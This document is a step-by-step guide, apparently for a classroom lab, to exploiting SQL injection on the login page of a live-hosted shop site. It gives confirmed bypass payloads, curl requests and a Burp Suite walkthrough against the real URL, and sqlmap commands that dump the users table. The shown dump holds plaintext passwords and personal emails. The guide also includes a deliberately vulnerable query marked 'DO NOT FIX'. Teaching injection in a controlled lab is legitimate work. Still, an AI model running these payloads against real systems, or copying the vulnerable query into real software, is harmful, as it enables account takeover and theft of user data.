# SQL Injection - Login Bypass Exploitation Guide

## ⚠️ Common Error and Why It Happens

**Error you're seeing:**
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version...
```

**Root Cause:** MySQL requires a **space after `--`** for comments. The payload `' OR 1=1 --` doesn't work because there's no space after the double dash.

---

## ✅ Working Payloads (Tested & Confirmed)

### Method 1: OR 1=1 with Space After Comment ✅

**Email Field:**
```
' OR 1=1 -- -
```

**Password Field:**
```
anything
```

**Why it works:** The space + dash after `--` satisfies MySQL's comment syntax requirement.

**Resulting SQL Query:**
```sql
SELECT * FROM users WHERE email = '' OR 1=1 -- -' AND password = 'anything'
```

Everything after `-- ` is commented out, and `OR 1=1` is always true.

**Result:** Logs in as **admin@shopease.in** (first user in database)

---

### Method 2: Using # Comment Symbol ✅

**Email Field:**
```
' OR 1=1 #
```

**Password Field:**
```
anything
```

**Why it works:** `#` is MySQL's alternative comment syntax (doesn't need a space).

**Resulting SQL Query:**
```sql
SELECT * FROM users WHERE email = '' OR 1=1 #' AND password = 'anything'
```

**Result:** Logs in as **admin@shopease.in**

---

### Method 3: Known Email + OR Bypass ✅

**Email Field:**
```
admin@shopease.in' OR '1'='1
```

**Password Field:**
```
x
```

**Resulting SQL Query:**
```sql
SELECT * FROM users WHERE email = 'admin@shopease.in' OR '1'='1' AND password = 'x'
```

**Result:** Logs in as **admin@shopease.in**

---

### Method 4: Target Specific User ✅

**Email Field:**
```
strawhattemp6@gmail.com' -- -
```

**Password Field:**
```
ignored
```

**Resulting SQL Query:**
```sql
SELECT * FROM users WHERE email = 'strawhattemp6@gmail.com' -- -' AND password = 'ignored'
```

The password check is completely commented out.

**Result:** Logs in as **strawhat** without knowing password

---

## 🖥️ Browser-Based Exploitation (Step-by-Step)

### Step 1: Navigate to Login
Open: https://shopease.zevonai.com/login

### Step 2: Enter Payload

**Option A (Recommended for beginners):**
- Email: `' OR 1=1 #`
- Password: `test`
- Click "Login"

**Option B (Standard technique):**
- Email: `' OR 1=1 -- -`
- Password: `anything`
- Click "Login"

### Step 3: Observe Success

You are redirected to:
```
https://shopease.zevonai.com/products?user=admin@shopease.in&role=admin
```

You are now logged in as **admin** without knowing the password.

### Step 4: Verify Admin Access

- Click on your profile dropdown (top right)
- You'll see "Admin Panel" option
- Click to access `/zevon-admin`
- Full admin privileges granted

---

## 🔧 Command Line Exploitation (curl)

### Test 1: Basic SQLi with curl

```bash
curl -X POST https://shopease.zevonai.com/login \
  -d "email=' OR 1=1 -- -&password=x" \
  -i | grep "Location:"
```

**Expected Output:**
```
Location: /products?user=admin@shopease.in&role=admin
```

### Test 2: Using # Comment

```bash
curl -X POST https://shopease.zevonai.com/login \
  -d "email=' OR 1=1 #&password=test" \
  -i | grep "Location:"
```

### Test 3: Bypass Password for Specific User

```bash
curl -X POST https://shopease.zevonai.com/login \
  -d "email=strawhattemp6@gmail.com' -- -&password=ignored" \
  -i | grep "Location:"
```

**Expected Output:**
```
Location: /products?user=strawhattemp6@gmail.com&role=user
```

### Test 4: Get Session Cookie

```bash
curl -X POST https://shopease.zevonai.com/login \
  -d "email=' OR 1=1 #&password=x" \
  -c cookies.txt \
  -i

# Verify session
curl -b cookies.txt https://shopease.zevonai.com/zevon-admin \
  | grep -o "Admin Dashboard"
```

---

## 🛠️ Burp Suite Exploitation

### Setup
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to https://shopease.zevonai.com/login
3. Turn on **Intercept** in Burp

### Exploitation
1. Enter any credentials in the form and click "Login"
2. Burp intercepts the POST request:
```
POST /login HTTP/1.1
Host: shopease.zevonai.com
Content-Type: application/x-www-form-urlencoded

email=test@test.com&password=test123
```

3. Modify the `email` parameter:
```
email=' OR 1=1 -- -&password=test123
```

4. Forward the request

5. Observer response:
```
HTTP/1.1 302 Found
Location: /products?user=admin@shopease.in&role=admin
```

### Repeater Testing
1. Send to **Repeater** (Ctrl+R)
2. Test different payloads:
   - `' OR 1=1 #`
   - `' OR '1'='1' -- -`
   - `admin@shopease.in' OR '1'='1`
3. Click "Send" and check response

---

## 🤖 sqlmap Automation

### Basic Scan

```bash
sqlmap -u "https://shopease.zevonai.com/login" \
  --data="email=test&password=test" \
  --batch \
  --level=1 \
  --risk=1
```

### Dump All Users

```bash
sqlmap -u "https://shopease.zevonai.com/login" \
  --data="email=test&password=test" \
  --dump -T users \
  --batch
```

**Expected Output:**
```
+----+----------+----------------------+------------+------+
| id | role     | email                | password   | name |
+----+----------+----------------------+------------+------+
| 1  | admin    | admin@shopease.in    | admin123   | Admin User |
| 2  | user     | rajesh@gmail.com     | password123| Rajesh Kumar |
| 3  | user     | priya.sharma@yahoo.com| user1234  | Priya Sharma |
...
```

---

## ❌ Common Mistakes (Why You're Getting Errors)

### Mistake 1: Missing Space After `--`

**Wrong:**
```
' OR 1=1 --
```

**Error:**
```
You have an error in your SQL syntax
```

**Fix:** Add space and dash:
```
' OR 1=1 -- -
```

---

### Mistake 2: URL Encoding Issues

**Wrong (curl):**
```bash
curl --data-urlencode "email=' OR 1=1 --"
```

This double-encodes the payload and breaks it.

**Fix:** Use raw `-d` flag:
```bash
curl -d "email=' OR 1=1 #&password=x"
```

---

### Mistake 3: Using Wrong Comment Syntax

Different databases need different syntax:

| Database | Comment Syntax |
|----------|----------------|
| MySQL | `-- ` (space required) or `#` |
| PostgreSQL | `--` (no space needed) |
| MSSQL | `--` (no space needed) |
| Oracle | `--` (no space needed) |

ShopEase uses **MySQL**, so use `#` or `-- -`

---

## 📊 All Working Payloads Summary

| Payload | Result |
|---------|--------|
| `' OR 1=1 #` | Login as admin |
| `' OR 1=1 -- -` | Login as admin |
| `' OR '1'='1' -- -` | Login as admin |
| `admin@shopease.in' #` | Login as admin (bypass password) |
| `strawhattemp6@gmail.com' -- -` | Login as strawhat |
| `' OR 1=1 LIMIT 1 #` | Login as first user (admin) |
| `' UNION SELECT 1,2,3,4,5,6,7,8 #` | Error-based injection |

---

## 🎯 What to Test in Class

### Beginner Level
- [ ] Copy `' OR 1=1 #` into email field
- [ ] Enter any password
- [ ] Observe successful admin login

### Intermediate Level  
- [ ] Use Burp Suite to intercept and modify
- [ ] Try 3 different payload variations
- [ ] Access admin panel after successful injection

### Advanced Level
- [ ] Use sqlmap to dump entire database
- [ ] Write Python script to automate login
- [ ] Extract all user passwords via UNION injection

---

## 🔐 Why This Works

The vulnerable code (DO NOT FIX):

```javascript
const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
```

User input is directly concatenated. When we input `' OR 1=1 #`, the query becomes:

```sql
SELECT * FROM users WHERE email = '' OR 1=1 #' AND password = 'x'
```

Which is interpreted as:

```sql
SELECT * FROM users WHERE email = '' OR 1=1
```

Since `1=1` is always true, it returns **all users**. The application takes the first row (admin) and logs us in.

---

## 🎓 Teaching Points

1. **Always use parameterized queries** (prepared statements)
2. **Never concatenate user input into SQL**
3. **Input validation is not enough** - you need parameterization
4. **Defense in depth** - even with validation, use safe queries
5. **Least privilege** - database user shouldn't have full access

---

## ✅ Quick Testing Checklist

- [ ] Payload `' OR 1=1 #` successfully logs in as admin
- [ ] Can access `/zevon-admin` after injection
- [ ] URL shows `?user=admin@shopease.in&role=admin`
- [ ] Same payload works in curl/Burp Suite
- [ ] Can target specific users with `email' -- -` format
- [ ] sqlmap successfully identifies the vulnerability

---

**Live Test URL:** https://shopease.zevonai.com/login  
**Last Verified:** Working as of July 7, 2026  
**Difficulty:** Beginner (No encoding/WAF bypass needed)
